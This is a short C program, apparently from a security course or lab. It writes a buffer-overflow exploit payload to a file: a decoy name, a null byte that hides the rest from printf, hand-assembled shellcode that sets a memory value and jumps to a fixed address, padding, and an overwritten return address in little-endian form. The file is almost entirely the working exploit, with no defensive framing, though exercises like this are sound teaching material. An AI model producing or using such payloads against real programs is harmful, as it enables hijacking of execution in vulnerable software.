#include <stdio.h>
#include <stdlib.h>

int main(void){
	int i;
	FILE *file = fopen("data9", "w");


	if (file == NULL){
		fprintf(stderr, "couldnt crete the file: data6");
		exit(-1);
	}

	/*place the name i want to display
	 *in the start of the buff*/
	fputc('G', file); 
	fputc('e', file);	
	fputc('o', file);	
	fputc('r', file);	
	fputc('g', file);	
	fputc('e', file);	

	/*null terimator after the name we want
	 *to display so the printf stops threre
	 *effectively hiding everything we put after.*/ 
	fputc(0x0, file);

	/*add the instraction we want to excecute*/
        /*	
	0:   c6 05 68 30 0e 08 39    movb   $0x39,0x80e3068
   	7:   bb 95 9e 04 08          mov    $0x8049e95,%ebx
   	c:   ff e3                   jmp    *%ebx
	*/

	fputc(0xc6, file);
	fputc(0x05, file);
	fputc(0x68, file);
	fputc(0x30, file);
	fputc(0x0e, file);
	fputc(0x08, file);
	fputc(0x39, file);

	fputc(0xbb, file);
	fputc(0x95, file);
	fputc(0x9e, file);
	fputc(0x04, file);
	fputc(0x08, file);

	fputc(0xff, file);
	fputc(0xe3, file);

	/*filling the rest of the buff*/
	for(i = 0; i < 9; i++){
		fputc('i',file); 
	}

	/*fill the veriabel c*/
	for(i = 0; i < 4; i++){
		fputc('i',file);
	}

	/*fill i with the intex to go 
         go to the return address*/
	fputc(0x32, file);

	/*fill the return address the addrss of the Name where the 
	 * instractions will be moved to and we excecute them there*/
	/*the address must be given in little endiant format*/
	/*0x80e42e3*/
	fputc(0xe3, file);
	fputc(0x42, file);
	fputc(0x0e, file);
	fputc(0x08, file);

	/*reajust the s to point at the Name+offset*/
	/*the address must be given in little endiant format*/
	fputc(0xdc, file);
	fputc(0x42, file);
	fputc(0x0e, file);
	fputc(0x08, file);

	fclose(file);

	return 0;
}

